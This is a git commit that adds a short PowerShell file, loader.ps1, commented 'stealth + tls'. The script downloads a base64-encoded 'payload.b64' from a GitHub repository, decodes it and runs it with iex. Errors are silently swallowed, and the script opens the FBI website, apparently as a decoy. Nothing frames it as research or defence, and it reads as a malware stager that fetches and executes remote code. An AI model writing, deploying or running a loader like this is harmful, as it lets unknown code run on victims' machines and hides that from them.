baa23fe974f7584b65f8e881c2bafc82cff57b29
Extremelyz <103514429+Extremelyz@users.noreply.github.com>
2026-04-03 17:31:23 +0700

    Add files via upload

---
+++ loader.ps1
@@ -0,0 +1,18 @@
+﻿# stealth + tls
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+try {
+    $u = "https://raw.githubusercontent.com/Extremelyz/shhhhh/refs/heads/main/payload.b64"
+
+    $b = (New-Object Net.WebClient).DownloadString($u)
+
+    # decode
+    $d = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b))
+
+    # run
+    iex $d
+
+    # optional: เปิดเว็บ
+    Start-Process "https://www.fbi.gov/"
+
+} catch {}
